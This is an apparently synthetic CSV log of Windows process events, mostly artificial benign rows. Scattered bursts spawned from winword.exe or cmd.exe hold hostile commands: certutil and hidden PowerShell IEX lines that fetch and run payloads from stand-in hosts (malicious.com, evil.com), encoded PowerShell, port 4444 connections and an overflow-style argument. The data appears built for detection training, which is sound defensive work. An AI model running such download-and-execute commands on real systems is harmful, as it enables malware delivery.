timestamp,process,parent_process,command_line,ip,destination_port,user_agent
2026-03-30 18:16:37,cmd.exe,explorer.exe,cmd dir,192.168.1.229,0,chrome
2026-03-30 18:16:38,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.30,0,chrome
2026-03-30 18:16:39,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.242,0,chrome
2026-03-30 18:16:40,explorer.exe,explorer.exe,cmd dir,192.168.1.194,0,chrome
2026-03-30 18:16:41,cmd.exe,explorer.exe,cmd dir,192.168.1.143,0,chrome
2026-03-30 18:16:42,notepad.exe,explorer.exe,cmd dir,192.168.1.238,0,chrome
2026-03-30 18:16:43,cmd.exe,explorer.exe,explorer open folder,192.168.1.108,0,chrome
2026-03-30 18:16:44,cmd.exe,explorer.exe,notepad file.txt,192.168.1.183,0,chrome
2026-03-30 18:16:45,notepad.exe,explorer.exe,explorer open folder,192.168.1.151,0,chrome
2026-03-30 18:16:46,chrome.exe,explorer.exe,notepad file.txt,192.168.1.147,0,chrome
2026-03-30 18:16:47,chrome.exe,explorer.exe,explorer open folder,192.168.1.42,0,chrome
2026-03-30 18:16:48,explorer.exe,explorer.exe,notepad file.txt,192.168.1.217,0,chrome
2026-03-30 18:16:49,explorer.exe,explorer.exe,cmd dir,192.168.1.69,0,chrome
2026-03-30 18:16:50,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.137,0,chrome
2026-03-30 18:16:51,cmd.exe,explorer.exe,notepad file.txt,192.168.1.240,0,chrome
2026-03-30 18:16:52,notepad.exe,explorer.exe,explorer open folder,192.168.1.220,0,chrome
2026-03-30 18:16:53,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.131,0,chrome
2026-03-30 18:16:54,chrome.exe,explorer.exe,notepad file.txt,192.168.1.98,0,chrome
2026-03-30 18:16:55,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.255,0,chrome
2026-03-30 18:16:56,explorer.exe,explorer.exe,explorer open folder,192.168.1.183,0,chrome
2026-03-30 18:16:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.133,0,chrome
2026-03-30 18:16:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.2,0,chrome
2026-03-30 18:16:59,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.60,0,chrome
2026-03-30 18:17:00,chrome.exe,explorer.exe,notepad file.txt,192.168.1.224,0,chrome
2026-03-30 18:17:01,explorer.exe,explorer.exe,explorer open folder,192.168.1.165,0,chrome
2026-03-30 18:17:02,explorer.exe,explorer.exe,cmd dir,192.168.1.11,0,chrome
2026-03-30 18:17:03,notepad.exe,explorer.exe,explorer open folder,192.168.1.158,0,chrome
2026-03-30 18:17:04,explorer.exe,explorer.exe,cmd dir,192.168.1.199,0,chrome
2026-03-30 18:17:05,cmd.exe,explorer.exe,notepad file.txt,192.168.1.248,0,chrome
2026-03-30 18:17:06,cmd.exe,explorer.exe,cmd dir,192.168.1.156,0,chrome
2026-03-30 18:17:07,notepad.exe,explorer.exe,explorer open folder,192.168.1.166,0,chrome
2026-03-30 18:17:08,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
2026-03-30 18:17:09,notepad.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
2026-03-30 18:17:10,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.81,0,chrome
2026-03-30 18:17:11,explorer.exe,explorer.exe,explorer open folder,192.168.1.103,0,chrome
2026-03-30 18:17:12,cmd.exe,explorer.exe,notepad file.txt,192.168.1.61,0,chrome
2026-03-30 18:17:13,cmd.exe,explorer.exe,cmd dir,192.168.1.216,0,chrome
2026-03-30 18:17:14,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.188,0,chrome
2026-03-30 18:17:15,notepad.exe,explorer.exe,explorer open folder,192.168.1.173,0,chrome
2026-03-30 18:17:16,cmd.exe,explorer.exe,cmd dir,192.168.1.245,0,chrome
2026-03-30 18:17:17,explorer.exe,explorer.exe,cmd dir,192.168.1.213,0,chrome
2026-03-30 18:17:18,explorer.exe,explorer.exe,cmd dir,192.168.1.7,0,chrome
2026-03-30 18:17:19,notepad.exe,explorer.exe,cmd dir,192.168.1.40,0,chrome
2026-03-30 18:17:20,chrome.exe,explorer.exe,cmd dir,192.168.1.56,0,chrome
2026-03-30 18:17:21,cmd.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
2026-03-30 18:17:22,explorer.exe,explorer.exe,cmd dir,192.168.1.120,0,chrome
2026-03-30 18:17:23,cmd.exe,explorer.exe,cmd dir,192.168.1.39,0,chrome
2026-03-30 18:17:24,cmd.exe,explorer.exe,explorer open folder,192.168.1.130,0,chrome
2026-03-30 18:17:25,explorer.exe,explorer.exe,explorer open folder,192.168.1.120,0,chrome
2026-03-30 18:17:26,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.149,0,chrome
2026-03-30 18:17:27,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.112,0,chrome
2026-03-30 18:17:28,explorer.exe,explorer.exe,notepad file.txt,192.168.1.205,0,chrome
2026-03-30 18:17:29,notepad.exe,explorer.exe,explorer open folder,192.168.1.94,0,chrome
2026-03-30 18:17:30,explorer.exe,explorer.exe,notepad file.txt,192.168.1.206,0,chrome
2026-03-30 18:17:31,cmd.exe,explorer.exe,notepad file.txt,192.168.1.26,0,chrome
2026-03-30 18:17:32,notepad.exe,explorer.exe,explorer open folder,192.168.1.63,0,chrome
2026-03-30 18:17:33,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.7,0,chrome
2026-03-30 18:17:34,chrome.exe,explorer.exe,notepad file.txt,192.168.1.98,0,chrome
2026-03-30 18:17:35,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.180,0,chrome
2026-03-30 18:17:36,notepad.exe,explorer.exe,explorer open folder,192.168.1.228,0,chrome
2026-03-30 18:17:37,cmd.exe,explorer.exe,notepad file.txt,192.168.1.90,0,chrome
2026-03-30 18:17:38,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.193,0,chrome
2026-03-30 18:17:39,explorer.exe,explorer.exe,explorer open folder,192.168.1.182,0,chrome
2026-03-30 18:17:40,cmd.exe,explorer.exe,notepad file.txt,192.168.1.13,0,chrome
2026-03-30 18:17:41,explorer.exe,explorer.exe,cmd dir,192.168.1.75,0,chrome
2026-03-30 18:17:42,cmd.exe,explorer.exe,cmd dir,192.168.1.139,0,chrome
2026-03-30 18:17:43,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.8,0,chrome
2026-03-30 18:17:44,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.195,0,chrome
2026-03-30 18:17:45,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,443,curl
2026-03-30 18:17:46,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),45.33.32.156,80,curl
2026-03-30 18:17:47,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,80,python-requests
2026-03-30 18:17:48,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,443,python-requests
2026-03-30 18:17:49,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,443,python-requests
2026-03-30 18:17:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:17:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:17:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:17:53,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
2026-03-30 18:17:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.140,0,chrome
2026-03-30 18:17:55,explorer.exe,explorer.exe,notepad file.txt,192.168.1.255,0,chrome
2026-03-30 18:17:56,notepad.exe,explorer.exe,explorer open folder,192.168.1.93,0,chrome
2026-03-30 18:17:57,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.231,0,chrome
2026-03-30 18:17:58,explorer.exe,explorer.exe,explorer open folder,192.168.1.54,0,chrome
2026-03-30 18:17:59,chrome.exe,explorer.exe,cmd dir,192.168.1.171,0,chrome
2026-03-30 18:18:00,explorer.exe,explorer.exe,notepad file.txt,192.168.1.220,0,chrome
2026-03-30 18:18:01,cmd.exe,explorer.exe,cmd dir,192.168.1.27,0,chrome
2026-03-30 18:18:02,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.168,0,chrome
2026-03-30 18:18:03,cmd.exe,explorer.exe,explorer open folder,192.168.1.126,0,chrome
2026-03-30 18:18:04,explorer.exe,explorer.exe,cmd dir,192.168.1.162,0,chrome
2026-03-30 18:18:05,chrome.exe,explorer.exe,cmd dir,192.168.1.200,0,chrome
2026-03-30 18:18:06,chrome.exe,explorer.exe,cmd dir,192.168.1.216,0,chrome
2026-03-30 18:18:07,chrome.exe,explorer.exe,cmd dir,192.168.1.222,0,chrome
2026-03-30 18:18:08,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.141,0,chrome
2026-03-30 18:18:09,explorer.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
2026-03-30 18:18:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.213,0,chrome
2026-03-30 18:18:11,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
2026-03-30 18:18:12,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.12,0,chrome
2026-03-30 18:18:13,notepad.exe,explorer.exe,notepad file.txt,192.168.1.82,0,chrome
2026-03-30 18:18:14,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.62,0,chrome
2026-03-30 18:18:15,chrome.exe,explorer.exe,cmd dir,192.168.1.191,0,chrome
2026-03-30 18:18:16,notepad.exe,explorer.exe,notepad file.txt,192.168.1.214,0,chrome
2026-03-30 18:18:17,chrome.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
2026-03-30 18:18:18,cmd.exe,explorer.exe,explorer open folder,192.168.1.63,0,chrome
2026-03-30 18:18:19,notepad.exe,explorer.exe,notepad file.txt,192.168.1.72,0,chrome
2026-03-30 18:18:20,cmd.exe,explorer.exe,notepad file.txt,192.168.1.252,0,chrome
2026-03-30 18:18:21,chrome.exe,explorer.exe,explorer open folder,192.168.1.91,0,chrome
2026-03-30 18:18:22,explorer.exe,explorer.exe,notepad file.txt,192.168.1.69,0,chrome
2026-03-30 18:18:23,explorer.exe,explorer.exe,notepad file.txt,192.168.1.248,0,chrome
2026-03-30 18:18:24,notepad.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
2026-03-30 18:18:25,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.120,0,chrome
2026-03-30 18:18:26,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.154,0,chrome
2026-03-30 18:18:27,notepad.exe,explorer.exe,explorer open folder,192.168.1.111,0,chrome
2026-03-30 18:18:28,explorer.exe,explorer.exe,notepad file.txt,192.168.1.67,0,chrome
2026-03-30 18:18:29,notepad.exe,explorer.exe,cmd dir,192.168.1.2,0,chrome
2026-03-30 18:18:30,cmd.exe,explorer.exe,notepad file.txt,192.168.1.57,0,chrome
2026-03-30 18:18:31,cmd.exe,explorer.exe,explorer open folder,192.168.1.240,0,chrome
2026-03-30 18:18:32,notepad.exe,explorer.exe,notepad file.txt,192.168.1.128,0,chrome
2026-03-30 18:18:33,cmd.exe,explorer.exe,cmd dir,192.168.1.193,0,chrome
2026-03-30 18:18:34,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.184,0,chrome
2026-03-30 18:18:35,chrome.exe,explorer.exe,cmd dir,192.168.1.98,0,chrome
2026-03-30 18:18:36,explorer.exe,explorer.exe,explorer open folder,192.168.1.195,0,chrome
2026-03-30 18:18:37,cmd.exe,explorer.exe,explorer open folder,192.168.1.152,0,chrome
2026-03-30 18:18:38,chrome.exe,explorer.exe,explorer open folder,192.168.1.36,0,chrome
2026-03-30 18:18:39,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.83,0,chrome
2026-03-30 18:18:40,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.201,0,chrome
2026-03-30 18:18:41,chrome.exe,explorer.exe,notepad file.txt,192.168.1.37,0,chrome
2026-03-30 18:18:42,explorer.exe,explorer.exe,explorer open folder,192.168.1.235,0,chrome
2026-03-30 18:18:43,notepad.exe,explorer.exe,notepad file.txt,192.168.1.70,0,chrome
2026-03-30 18:18:44,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.45,0,chrome
2026-03-30 18:18:45,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
2026-03-30 18:18:46,explorer.exe,explorer.exe,notepad file.txt,192.168.1.15,0,chrome
2026-03-30 18:18:47,notepad.exe,explorer.exe,cmd dir,192.168.1.213,0,chrome
2026-03-30 18:18:48,explorer.exe,explorer.exe,explorer open folder,192.168.1.142,0,chrome
2026-03-30 18:18:49,explorer.exe,explorer.exe,cmd dir,192.168.1.11,0,chrome
2026-03-30 18:18:50,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.232,0,chrome
2026-03-30 18:18:51,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.70,0,chrome
2026-03-30 18:18:52,explorer.exe,explorer.exe,explorer open folder,192.168.1.145,0,chrome
2026-03-30 18:18:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.77,0,chrome
2026-03-30 18:18:54,chrome.exe,explorer.exe,cmd dir,192.168.1.217,0,chrome
2026-03-30 18:18:55,chrome.exe,explorer.exe,cmd dir,192.168.1.244,0,chrome
2026-03-30 18:18:56,cmd.exe,explorer.exe,notepad file.txt,192.168.1.108,0,chrome
2026-03-30 18:18:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.248,0,chrome
2026-03-30 18:18:58,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.80,0,chrome
2026-03-30 18:18:59,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.39,0,chrome
2026-03-30 18:19:00,chrome.exe,explorer.exe,cmd dir,192.168.1.123,0,chrome
2026-03-30 18:19:01,chrome.exe,explorer.exe,notepad file.txt,192.168.1.77,0,chrome
2026-03-30 18:19:02,cmd.exe,explorer.exe,notepad file.txt,192.168.1.54,0,chrome
2026-03-30 18:19:03,cmd.exe,explorer.exe,cmd dir,192.168.1.232,0,chrome
2026-03-30 18:19:04,cmd.exe,explorer.exe,explorer open folder,192.168.1.135,0,chrome
2026-03-30 18:19:05,cmd.exe,explorer.exe,explorer open folder,192.168.1.117,0,chrome
2026-03-30 18:19:06,cmd.exe,explorer.exe,explorer open folder,192.168.1.141,0,chrome
2026-03-30 18:19:07,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
2026-03-30 18:19:08,explorer.exe,explorer.exe,explorer open folder,192.168.1.125,0,chrome
2026-03-30 18:19:09,chrome.exe,explorer.exe,explorer open folder,192.168.1.49,0,chrome
2026-03-30 18:19:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.159,0,chrome
2026-03-30 18:19:11,explorer.exe,explorer.exe,notepad file.txt,192.168.1.214,0,chrome
2026-03-30 18:19:12,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.70,0,chrome
2026-03-30 18:19:13,cmd.exe,explorer.exe,notepad file.txt,192.168.1.243,0,chrome
2026-03-30 18:19:14,explorer.exe,explorer.exe,cmd dir,192.168.1.101,0,chrome
2026-03-30 18:19:15,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.236,0,chrome
2026-03-30 18:19:16,chrome.exe,explorer.exe,cmd dir,192.168.1.147,0,chrome
2026-03-30 18:19:17,cmd.exe,explorer.exe,notepad file.txt,192.168.1.157,0,chrome
2026-03-30 18:19:18,notepad.exe,explorer.exe,cmd dir,192.168.1.235,0,chrome
2026-03-30 18:19:19,cmd.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
2026-03-30 18:19:20,chrome.exe,explorer.exe,cmd dir,192.168.1.8,0,chrome
2026-03-30 18:19:21,cmd.exe,explorer.exe,notepad file.txt,192.168.1.191,0,chrome
2026-03-30 18:19:22,cmd.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
2026-03-30 18:19:23,cmd.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
2026-03-30 18:19:24,cmd.exe,explorer.exe,notepad file.txt,192.168.1.72,0,chrome
2026-03-30 18:19:25,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,curl
2026-03-30 18:19:26,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,python-requests
2026-03-30 18:19:27,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,1.1.1.1,4444,curl
2026-03-30 18:19:28,powershell.exe,winword.exe,powershell -enc aW52b2tl,23.45.67.89,443,python-requests
2026-03-30 18:19:29,powershell.exe,winword.exe,powershell -enc aW52b2tl,8.8.8.8,443,curl
2026-03-30 18:19:30,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:19:31,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:19:32,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:19:33,chrome.exe,explorer.exe,explorer open folder,192.168.1.135,0,chrome
2026-03-30 18:19:34,notepad.exe,explorer.exe,explorer open folder,192.168.1.6,0,chrome
2026-03-30 18:19:35,explorer.exe,explorer.exe,notepad file.txt,192.168.1.140,0,chrome
2026-03-30 18:19:36,notepad.exe,explorer.exe,notepad file.txt,192.168.1.68,0,chrome
2026-03-30 18:19:37,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.79,0,chrome
2026-03-30 18:19:38,cmd.exe,explorer.exe,notepad file.txt,192.168.1.229,0,chrome
2026-03-30 18:19:39,cmd.exe,explorer.exe,explorer open folder,192.168.1.252,0,chrome
2026-03-30 18:19:40,chrome.exe,explorer.exe,cmd dir,192.168.1.212,0,chrome
2026-03-30 18:19:41,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.61,0,chrome
2026-03-30 18:19:42,chrome.exe,explorer.exe,explorer open folder,192.168.1.86,0,chrome
2026-03-30 18:19:43,chrome.exe,explorer.exe,cmd dir,192.168.1.42,0,chrome
2026-03-30 18:19:44,cmd.exe,explorer.exe,cmd dir,192.168.1.204,0,chrome
2026-03-30 18:19:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
2026-03-30 18:19:46,explorer.exe,explorer.exe,explorer open folder,192.168.1.8,0,chrome
2026-03-30 18:19:47,chrome.exe,explorer.exe,notepad file.txt,192.168.1.93,0,chrome
2026-03-30 18:19:48,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.229,0,chrome
2026-03-30 18:19:49,explorer.exe,explorer.exe,notepad file.txt,192.168.1.66,0,chrome
2026-03-30 18:19:50,chrome.exe,explorer.exe,explorer open folder,192.168.1.243,0,chrome
2026-03-30 18:19:51,chrome.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
2026-03-30 18:19:52,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.100,0,chrome
2026-03-30 18:19:53,explorer.exe,explorer.exe,explorer open folder,192.168.1.160,0,chrome
2026-03-30 18:19:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.255,0,chrome
2026-03-30 18:19:55,chrome.exe,explorer.exe,notepad file.txt,192.168.1.160,0,chrome
2026-03-30 18:19:56,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
2026-03-30 18:19:57,explorer.exe,explorer.exe,notepad file.txt,192.168.1.119,0,chrome
2026-03-30 18:19:58,chrome.exe,explorer.exe,notepad file.txt,192.168.1.90,0,chrome
2026-03-30 18:19:59,explorer.exe,explorer.exe,explorer open folder,192.168.1.171,0,chrome
2026-03-30 18:20:00,explorer.exe,explorer.exe,explorer open folder,192.168.1.131,0,chrome
2026-03-30 18:20:01,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.203,0,chrome
2026-03-30 18:20:02,chrome.exe,explorer.exe,explorer open folder,192.168.1.179,0,chrome
2026-03-30 18:20:03,cmd.exe,explorer.exe,explorer open folder,192.168.1.246,0,chrome
2026-03-30 18:20:04,cmd.exe,explorer.exe,cmd dir,192.168.1.141,0,chrome
2026-03-30 18:20:05,chrome.exe,explorer.exe,explorer open folder,192.168.1.154,0,chrome
2026-03-30 18:20:06,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.158,0,chrome
2026-03-30 18:20:07,explorer.exe,explorer.exe,notepad file.txt,192.168.1.193,0,chrome
2026-03-30 18:20:08,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.175,0,chrome
2026-03-30 18:20:09,cmd.exe,explorer.exe,explorer open folder,192.168.1.117,0,chrome
2026-03-30 18:20:10,cmd.exe,explorer.exe,notepad file.txt,192.168.1.197,0,chrome
2026-03-30 18:20:11,chrome.exe,explorer.exe,cmd dir,192.168.1.26,0,chrome
2026-03-30 18:20:12,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.28,0,chrome
2026-03-30 18:20:13,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.191,0,chrome
2026-03-30 18:20:14,chrome.exe,explorer.exe,notepad file.txt,192.168.1.28,0,chrome
2026-03-30 18:20:15,unknown_375.exe,winword.exe,random suspicious execution,8.8.8.8,9999,unknown
2026-03-30 18:20:16,notepad.exe,explorer.exe,explorer open folder,192.168.1.202,0,chrome
2026-03-30 18:20:17,notepad.exe,explorer.exe,notepad file.txt,192.168.1.251,0,chrome
2026-03-30 18:20:18,explorer.exe,explorer.exe,cmd dir,192.168.1.225,0,chrome
2026-03-30 18:20:19,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.75,0,chrome
2026-03-30 18:20:20,explorer.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
2026-03-30 18:20:21,explorer.exe,explorer.exe,notepad file.txt,192.168.1.121,0,chrome
2026-03-30 18:20:22,explorer.exe,explorer.exe,cmd dir,192.168.1.6,0,chrome
2026-03-30 18:20:23,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.205,0,chrome
2026-03-30 18:20:24,explorer.exe,explorer.exe,explorer open folder,192.168.1.68,0,chrome
2026-03-30 18:20:25,cmd.exe,explorer.exe,explorer open folder,192.168.1.17,0,chrome
2026-03-30 18:20:26,chrome.exe,explorer.exe,explorer open folder,192.168.1.202,0,chrome
2026-03-30 18:20:27,explorer.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
2026-03-30 18:20:28,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
2026-03-30 18:20:29,chrome.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
2026-03-30 18:20:30,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.207,0,chrome
2026-03-30 18:20:31,cmd.exe,explorer.exe,explorer open folder,192.168.1.60,0,chrome
2026-03-30 18:20:32,cmd.exe,explorer.exe,cmd dir,192.168.1.110,0,chrome
2026-03-30 18:20:33,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.180,0,chrome
2026-03-30 18:20:34,cmd.exe,explorer.exe,explorer open folder,192.168.1.124,0,chrome
2026-03-30 18:20:35,cmd.exe,explorer.exe,cmd dir,192.168.1.197,0,chrome
2026-03-30 18:20:36,cmd.exe,explorer.exe,explorer open folder,192.168.1.139,0,chrome
2026-03-30 18:20:37,cmd.exe,explorer.exe,explorer open folder,192.168.1.224,0,chrome
2026-03-30 18:20:38,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.242,0,chrome
2026-03-30 18:20:39,notepad.exe,explorer.exe,cmd dir,192.168.1.125,0,chrome
2026-03-30 18:20:40,cmd.exe,explorer.exe,explorer open folder,192.168.1.15,0,chrome
2026-03-30 18:20:41,cmd.exe,explorer.exe,cmd dir,192.168.1.237,0,chrome
2026-03-30 18:20:42,notepad.exe,explorer.exe,explorer open folder,192.168.1.159,0,chrome
2026-03-30 18:20:43,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.193,0,chrome
2026-03-30 18:20:44,explorer.exe,explorer.exe,notepad file.txt,192.168.1.15,0,chrome
2026-03-30 18:20:45,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.235,0,chrome
2026-03-30 18:20:46,chrome.exe,explorer.exe,explorer open folder,192.168.1.216,0,chrome
2026-03-30 18:20:47,cmd.exe,explorer.exe,cmd dir,192.168.1.31,0,chrome
2026-03-30 18:20:48,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
2026-03-30 18:20:49,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
2026-03-30 18:20:50,explorer.exe,explorer.exe,notepad file.txt,192.168.1.15,0,chrome
2026-03-30 18:20:51,notepad.exe,explorer.exe,notepad file.txt,192.168.1.191,0,chrome
2026-03-30 18:20:52,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.134,0,chrome
2026-03-30 18:20:53,chrome.exe,explorer.exe,notepad file.txt,192.168.1.202,0,chrome
2026-03-30 18:20:54,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.74,0,chrome
2026-03-30 18:20:55,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.146,0,chrome
2026-03-30 18:20:56,explorer.exe,explorer.exe,cmd dir,192.168.1.176,0,chrome
2026-03-30 18:20:57,notepad.exe,explorer.exe,cmd dir,192.168.1.165,0,chrome
2026-03-30 18:20:58,notepad.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
2026-03-30 18:20:59,explorer.exe,explorer.exe,explorer open folder,192.168.1.131,0,chrome
2026-03-30 18:21:00,cmd.exe,explorer.exe,notepad file.txt,192.168.1.219,0,chrome
2026-03-30 18:21:01,cmd.exe,explorer.exe,explorer open folder,192.168.1.186,0,chrome
2026-03-30 18:21:02,explorer.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
2026-03-30 18:21:03,chrome.exe,explorer.exe,cmd dir,192.168.1.5,0,chrome
2026-03-30 18:21:04,chrome.exe,explorer.exe,cmd dir,192.168.1.72,0,chrome
2026-03-30 18:21:05,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,4444,python-requests
2026-03-30 18:21:06,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,80,curl
2026-03-30 18:21:07,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,443,curl
2026-03-30 18:21:08,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,80,python-requests
